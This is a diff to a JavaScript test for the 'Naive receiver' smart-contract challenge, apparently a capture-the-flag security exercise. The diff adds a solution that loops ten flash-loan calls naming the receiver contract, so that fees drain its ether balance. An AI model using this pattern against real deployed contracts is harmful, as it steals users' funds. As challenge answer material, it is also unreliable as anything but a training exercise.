@@ -31,7 +31,16 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
+    /** YOUR EXPLOIT GOES HERE */
+        
+        // PoA
+        // send flash loans to the users address 10 times
+        // each flash loan will remove 1 ether from their
+        // balance from the transaction fee
+        // TODO: Do this in a single transaction?
+        for (let i = 0; i < 10; i++){
+            await this.pool.flashLoan(this.receiver.address, 10);
+        }
     });
 
     after(async function () {
